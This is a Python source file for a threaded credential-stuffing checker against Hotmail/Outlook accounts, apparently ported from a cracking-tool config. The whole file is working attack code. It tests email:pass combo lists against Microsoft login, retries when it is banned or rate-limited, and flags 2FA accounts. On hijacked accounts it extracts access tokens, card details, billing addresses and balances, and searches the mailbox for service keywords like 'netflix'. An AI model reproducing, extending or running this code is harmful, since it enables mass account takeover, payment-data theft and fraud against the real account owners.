"""
Hotmail/Outlook mail:pass checker — ported from @rapesoull hotmail.com v4 (.svb)
Threaded (requests). Login → payment/CC/address/country capture → inbox search.
Retry logic on bans/timeouts to match .svb parity — no hits skipped.
"""

import requests
import urllib.parse
import json
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

MAX_RETRIES = 3
RETRY_DELAY = 2  # seconds between retries

COUNTRY_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AS": "American Samoa",
    "AD": "Andorra", "AO": "Angola", "AI": "Anguilla", "AG": "Antigua And Barbuda",
    "AR": "Argentina", "AM": "Armenia", "AW": "Aruba", "AU": "Australia",
    "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas", "BH": "Bahrain",
    "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus", "BE": "Belgium",
    "BZ": "Belize", "BJ": "Benin", "BM": "Bermuda", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana",
    "BR": "Brazil", "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso",
    "BI": "Burundi", "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada",
    "CV": "Cape Verde", "KY": "Cayman Islands", "CF": "Central African Republic",
    "TD": "Chad", "CL": "Chile", "CN": "China", "CO": "Colombia",
    "CG": "Congo", "CR": "Costa Rica", "HR": "Croatia", "CU": "Cuba",
    "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark", "DJ": "Djibouti",
    "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador", "EG": "Egypt",
    "SV": "El Salvador", "EE": "Estonia", "ET": "Ethiopia", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GE": "Georgia", "DE": "Germany",
    "GH": "Ghana", "GR": "Greece", "GT": "Guatemala", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KR": "Korea", "KW": "Kuwait", "KG": "Kyrgyzstan",
    "LA": "Laos", "LV": "Latvia", "LB": "Lebanon", "LY": "Libya",
    "LT": "Lithuania", "LU": "Luxembourg", "MY": "Malaysia", "MV": "Maldives",
    "MT": "Malta", "MX": "Mexico", "MD": "Moldova", "MC": "Monaco",
    "MN": "Mongolia", "ME": "Montenegro", "MA": "Morocco", "MZ": "Mozambique",
    "MM": "Myanmar", "NA": "Namibia", "NP": "Nepal", "NL": "Netherlands",
    "NZ": "New Zealand", "NI": "Nicaragua", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PA": "Panama", "PY": "Paraguay",
    "PE": "Peru", "PH": "Philippines", "PL": "Poland", "PT": "Portugal",
    "PR": "Puerto Rico", "QA": "Qatar", "RO": "Romania", "RU": "Russia",
    "RW": "Rwanda", "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia",
    "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia", "ZA": "South Africa",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SE": "Sweden",
    "CH": "Switzerland", "SY": "Syria", "TW": "Taiwan", "TZ": "Tanzania",
    "TH": "Thailand", "TN": "Tunisia", "TR": "Turkey", "UA": "Ukraine",
    "AE": "United Arab Emirates", "GB": "United Kingdom", "US": "United States",
    "UY": "Uruguay", "UZ": "Uzbekistan", "VE": "Venezuela", "VN": "Vietnam",
    "ZM": "Zambia", "ZW": "Zimbabwe",
}


def _parse_lr(text, left, right):
    """Extract string between left and right delimiters."""
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except (ValueError, IndexError):
        return ""


def _check_single(email, password, search_keyword=None):
    """
    Check a single Hotmail/Outlook account with retries.
    Returns dict with status, captures, detail.
    """
    for attempt in range(MAX_RETRIES):
        result = _attempt_check(email, password, search_keyword)

        # Only retry on retryable statuses
        if result["status"] == "retry":
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            else:
                # Exhausted retries, mark as fail so it's not silently lost
                result["status"] = "fail"
                result["detail"] = f"retry exhausted ({result.get('detail', '')})"
                return result

        return result

    return result


def _attempt_check(email, password, search_keyword=None):
    """Single attempt to check an account."""
    result = {
        "user": email,
        "password": password,
        "status": "fail",
        "captures": {},
        "detail": "",
    }

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    session.max_redirects = 8

    try:
        # ── Step 0: GET login page to extract fresh PPFT + cookies ──
        auth_url = (
            "https://login.live.com/oauth20_authorize.srf?"
            "client_id=0000000048170EF2"
            "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
            "&response_type=token"
            "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
            "&display=touch"
            f"&username={urllib.parse.quote(email)}"
        )

        pre_resp = session.get(auth_url, headers={
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        }, timeout=20)

        pre_body = pre_resp.text

        # Extract PPFT token
        ppft = _parse_lr(pre_body, 'name="PPFT" id="i0327" value="', '"')
        if not ppft:
            ppft = _parse_lr(pre_body, "sFT:'", "'")
        if not ppft:
            ppft = _parse_lr(pre_body, 'sFT:"', '"')
        if not ppft:
            result["status"] = "retry"
            result["detail"] = "no PPFT token"
            return result

        # Extract urlPost (the actual POST target)
        url_post = _parse_lr(pre_body, "urlPost:'", "'")
        if not url_post:
            url_post = _parse_lr(pre_body, 'urlPost:"', '"')
        if not url_post:
            url_post = (
                "https://login.live.com/ppsecure/post.srf?"
                "client_id=0000000048170EF2"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&display=touch"
                f"&username={urllib.parse.quote(email)}"
            )

        # ── Step 1: Login POST with fresh PPFT ──
        post_data = (
            "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
            "&hpgrequestid="
            f"&PPFT={urllib.parse.quote(ppft)}"
            "&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            "&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={urllib.parse.quote(email)}"
            f"&loginfmt={urllib.parse.quote(email)}"
            "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={urllib.parse.quote(password)}"
        )

        login_headers = {
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://login.live.com/oauth20_authorize.srf",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        }

        resp = session.post(url_post, data=post_data, headers=login_headers,
                            allow_redirects=True, timeout=30)

        body = resp.text
        final_url = str(resp.url)

        # ── Collect ALL cookies from session + response ──
        all_cookies = {}
        for c in session.cookies:
            all_cookies[c.name] = c.value
        for c in resp.cookies:
            all_cookies[c.name] = c.value
        all_cookies_str = str(all_cookies)

        # Also check redirect history cookies
        for hist_resp in resp.history:
            for c in hist_resp.cookies:
                all_cookies[c.name] = c.value
                all_cookies_str = str(all_cookies)

        # ── Key checks (exact .svb order) ──

        # Failure check
        is_bad_pass = "Your account or password is incorrect" in body
        is_no_account = "doesn\\'t exist" in body or "doesn't exist" in body
        is_sign_in_page = "Sign in to your Microsoft account" in body

        if is_bad_pass or is_no_account:
            result["status"] = "fail"
            result["detail"] = "bad credentials"
            return result

        # Ban check
        if ",AC:null,urlFedConvertRename" in body:
            result["status"] = "retry"
            result["detail"] = "ban/rate limit"
            return result

        # Sign-in page without valid cookies = failure
        if is_sign_in_page and "ANON" not in all_cookies_str and "WLSSC" not in all_cookies_str:
            result["status"] = "fail"
            result["detail"] = "bad credentials"
            return result

        # Success check — match ANY of these (OR logic like .svb)
        has_anon = "ANON" in all_cookies_str
        has_wlssc = "WLSSC" in all_cookies_str
        has_desktop = "oauth20_desktop.srf?" in final_url

        if not (has_anon or has_wlssc or has_desktop):
            # Not success yet — check 2FA/custom BEFORE marking fail
            pass

        # 2FA check
        if "account.live.com/recover?mkt" in body or \
           "recover?mkt" in body or \
           "account.live.com/identity/confirm?mkt" in body or \
           "Email/Confirm?mkt" in body:
            result["status"] = "2fa"
            result["detail"] = "2FA/recovery required"
            return result

        # Custom checks
        if "/cancel?mkt=" in body:
            result["status"] = "custom"
            result["detail"] = "cancel prompt"
            return result

        if "/Abuse?mkt=" in body:
            result["status"] = "custom"
            result["detail"] = "abuse flag"
            return result

        # Final success gate
        if not (has_anon or has_wlssc or has_desktop):
            result["status"] = "fail"
            result["detail"] = "login failed"
            return result

        result["status"] = "hit"

        # ── Step 2: Extract refresh token from final URL ──
        refresh_token = ""
        if "refresh_token=" in final_url:
            refresh_token = _parse_lr(final_url, "refresh_token=", "&")
        if not refresh_token and "refresh_token=" in body:
            refresh_token = _parse_lr(body, "refresh_token=", "&")
        # Also check redirect history URLs
        if not refresh_token:
            for hist_resp in resp.history:
                hist_url = str(hist_resp.url)
                if "refresh_token=" in hist_url:
                    refresh_token = _parse_lr(hist_url, "refresh_token=", "&")
                    break
            # Check Location headers too
            if not refresh_token:
                for hist_resp in resp.history:
                    loc = hist_resp.headers.get("Location", "")
                    if "refresh_token=" in loc:
                        refresh_token = _parse_lr(loc, "refresh_token=", "&")
                        break

        if not refresh_token:
            result["detail"] = "logged in, no refresh token"
            return result

        # ── Step 3: Exchange for substrate access token (with retry) ──
        access_token = ""
        for token_attempt in range(2):
            token_data = (
                "grant_type=refresh_token"
                "&client_id=0000000048170EF2"
                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                f"&refresh_token={refresh_token}"
                "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
            )

            try:
                token_resp = session.post(
                    "https://login.live.com/oauth20_token.srf",
                    data=token_data,
                    headers={
                        "x-ms-sso-Ignore-SSO": "1",
                        "User-Agent": "Outlook-Android/2.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Host": "login.live.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                    },
                    timeout=30,
                )
                access_token = token_resp.json().get("access_token", "")
            except Exception:
                access_token = ""

            if access_token and access_token.startswith("Ew"):
                break
            if token_attempt == 0:
                time.sleep(1)

        if not access_token or not access_token.startswith("Ew"):
            result["detail"] = "token exchange failed"
            return result

        # ── Step 4: Get PIFD token for payment instruments ──
        pifd_token = ""
        try:
            pifd_resp = session.get(
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=000000000004773A"
                "&response_type=token"
                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
                "&prompt=none",
                headers={
                    "Host": "login.live.com",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "Referer": "https://account.microsoft.com/",
                },
                allow_redirects=True,
                timeout=30,
            )
            pifd_url = str(pifd_resp.url)
            if "access_token=" in pifd_url:
                pifd_token = _parse_lr(pifd_url, "access_token=", "&token_type")
                if not pifd_token:
                    pifd_token = _parse_lr(pifd_url, "access_token=", "&")
        except Exception:
            pass

        # ── Step 5: Payment instruments ──
        if pifd_token:
            try:
                pay_resp = session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
                    "?status=active,removed&language=en-US",
                    headers={
                        "User-Agent": USER_AGENT,
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
                        "Connection": "keep-alive",
                        "Content-Type": "application/json",
                        "Host": "paymentinstruments.mp.microsoft.com",
                        "Origin": "https://account.microsoft.com",
                        "Referer": "https://account.microsoft.com/",
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "same-site",
                    },
                    timeout=30,
                )

                pay_body = pay_resp.text

                # ── Captures matching .svb config (clean format) ──

                # CAP "Name"
                name = _parse_lr(pay_body, '"accountHolderName":"', '"')
                if name:
                    result["captures"]["Name"] = name

                # CAP "Full Addy" — Address, City, State, Postalcode
                addr1 = _parse_lr(pay_body, '"address":{"address_line1":"', '"')
                try:
                    pay_json = pay_resp.json()
                    items = pay_json if isinstance(pay_json, list) else pay_json.get("paymentInstruments", [pay_json])
                    first = items[0] if items else {}
                    addr_obj = first.get("address", {}) if isinstance(first, dict) else {}
                    city = addr_obj.get("city", "")
                    region = addr_obj.get("region", "")
                    zipcode = addr_obj.get("postal_code", "")
                except Exception:
                    city = _parse_lr(pay_body, '"city":"', '"')
                    region = _parse_lr(pay_body, '"region":"', '"')
                    zipcode = _parse_lr(pay_body, '"postal_code":"', '"')

                parts = [p for p in [addr1, city, region, zipcode] if p]
                if parts:
                    result["captures"]["Full Addy"] = f"{addr1} | {city} | {region} | {zipcode}"

                # CAP "Balance"
                balance = _parse_lr(pay_body, 'balance":', ',"')
                if balance:
                    result["captures"]["Balance"] = f"${balance}"

                # CAP "CC Info" — CardHolder | CC | Month | Year | Last4 | Funding
                cc_holder = _parse_lr(pay_body, 'accountHolderName":"', '","')
                cc_name = _parse_lr(pay_body, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
                exp_month = _parse_lr(pay_body, 'expiryMonth":"', '",')
                exp_year = _parse_lr(pay_body, 'expiryYear":"', '",')
                last4 = _parse_lr(pay_body, 'lastFourDigits":"', '",')
                card_type = _parse_lr(pay_body, '"cardType":"', '"')

                if cc_name or last4:
                    result["captures"]["CC Info"] = (
                        f"Holder: {cc_holder} | Card: {cc_name} | "
                        f"Exp: {exp_month}/{exp_year} | Last4: {last4} | Type: {card_type}"
                    )

                # CAP "Country"
                country_code = _parse_lr(pay_body, '"country":"', '"')
                if country_code:
                    result["captures"]["Country"] = COUNTRY_MAP.get(country_code, country_code)

            except Exception:
                pass

        # ── Step 6: Mail folders ──
        try:
            folders_resp = session.get(
                "https://outlook.office.com/api/beta/me/MailFolders",
                headers={
                    "User-Agent": "Outlook-Android/2.0",
                    "Pragma": "no-cache",
                    "Accept": "application/json",
                    "ForceSync": "false",
                    "Authorization": f"Bearer {access_token}",
                    "Host": "substrate.office.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                },
                timeout=30,
            )
            try:
                folders_json = folders_resp.json()
                folder_names = []
                for f in folders_json.get("value", []):
                    folder_names.append(f.get("DisplayName", ""))
                if folder_names:
                    result["captures"]["Folders"] = ", ".join(folder_names[:10])
            except Exception:
                pass
        except Exception:
            pass

        # ── Step 7: Inbox search (service-specific keyword) ──
        if search_keyword:
            try:
                search_body = {
                    "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {
                            "Or": [
                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            ]
                        },
                        "From": 0,
                        "Query": {"QueryString": search_keyword},
                        "RefiningQueries": None,
                        "Size": 25,
                        "Sort": [
                            {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                            {"Field": "Time", "SortDirection": "Desc"},
                        ],
                        "EnableTopResults": True,
                        "TopResultsCount": 3,
                    }],
                    "AnswerEntityRequests": [{
                        "Query": {"QueryString": search_keyword},
                        "EntityTypes": ["Event", "File"],
                        "From": 0,
                        "Size": 10,
                        "EnableAsyncResolution": True,
                    }],
                    "QueryAlterationOptions": {
                        "EnableSuggestion": True,
                        "EnableAlteration": True,
                        "SupportedRecourseDisplayTypes": [
                            "Suggestion", "NoResultModification",
                            "NoResultFolderRefinerModification",
                            "NoRequeryModification", "Modification",
                        ],
                    },
                    "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
                }

                search_resp = session.post(
                    "https://outlook.live.com/search/api/v2/query?n=124",
                    json=search_body,
                    headers={
                        "User-Agent": "Outlook-Android/2.0",
                        "Pragma": "no-cache",
                        "Accept": "application/json",
                        "ForceSync": "false",
                        "Authorization": f"Bearer {access_token}",
                        "Host": "substrate.office.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                    },
                    timeout=30,
                )

                search_text = search_resp.text

                # CAP "Total Msg From <keyword>"
                total_msgs = _parse_lr(search_text, '"Total":', ',')
                if not total_msgs:
                    try:
                        total_msgs = str(search_resp.json().get("Total", "0"))
                    except Exception:
                        total_msgs = "0"
                kw_upper = search_keyword.upper()
                result["captures"][f"Total Msg From {kw_upper}"] = total_msgs.strip()

                # CAP "Last MSG From Mail"
                snippet = _parse_lr(search_text, '"HitHighlightedSummary":"', '",')
                snippet = re.sub(r'\[.*?\]', '', snippet).strip() if snippet else ""
                if snippet:
                    result["captures"]["Last MSG From Mail"] = snippet[:120]

                # CAP "Last Mail Msg" (date)
                last_date = _parse_lr(search_text, '"LastDeliveryTime":"', 'T')
                if last_date:
                    result["captures"]["Last Mail Msg"] = last_date

            except Exception:
                pass

    except requests.exceptions.Timeout:
        result["status"] = "retry"
        result["detail"] = "timed out"
    except requests.exceptions.ConnectionError:
        result["status"] = "retry"
        result["detail"] = "connection error"
    except Exception as ex:
        result["status"] = "fail"
        result["detail"] = str(ex)[:100]

    return result


def check_hotmail_accounts(accounts, search_keyword, max_threads=10,
                           on_progress=None, stop_event=None):
    """
    Check a list of email:pass combos against Hotmail/Outlook.
    search_keyword: e.g. "netflix", "roblox", "crunchyroll"
    Every single account is processed — nothing is skipped.
    Returns list of result dicts.
    """
    results = []
    done = [0]
    total = len(accounts)
    lock = threading.Lock()

    def worker(combo):
        if stop_event and stop_event.is_set():
            # Even stopped combos get a result so nothing is lost
            return {
                "user": combo.split(":", 1)[0] if ":" in combo else combo,
                "password": combo.split(":", 1)[1] if ":" in combo else "",
                "status": "fail",
                "captures": {},
                "detail": "stopped by user",
            }
        parts = combo.split(":", 1)
        if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
            # Invalid format — still return a result, not None
            return {
                "user": parts[0].strip() if parts else combo,
                "password": parts[1].strip() if len(parts) > 1 else "",
                "status": "fail",
                "captures": {},
                "detail": "invalid format",
            }
        email, password = parts[0].strip(), parts[1].strip()
        r = _check_single(email, password, search_keyword)
        with lock:
            done[0] += 1
            if on_progress:
                status = r.get("status", "fail")
                try:
                    on_progress(done[0], total, status)
                except TypeError:
                    # Backward compatibility for older bot.py callbacks that only accept (done, total)
                    on_progress(done[0], total)
        return r

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(worker, acc): acc for acc in accounts}
        for f in as_completed(futures):
            try:
                r = f.result()
                if r:
                    results.append(r)
            except Exception as ex:
                # Even exceptions produce a result
                acc = futures[f]
                results.append({
                    "user": acc.split(":", 1)[0] if ":" in acc else acc,
                    "password": acc.split(":", 1)[1] if ":" in acc else "",
                    "status": "fail",
                    "captures": {},
                    "detail": f"thread error: {str(ex)[:60]}",
                })

    return results
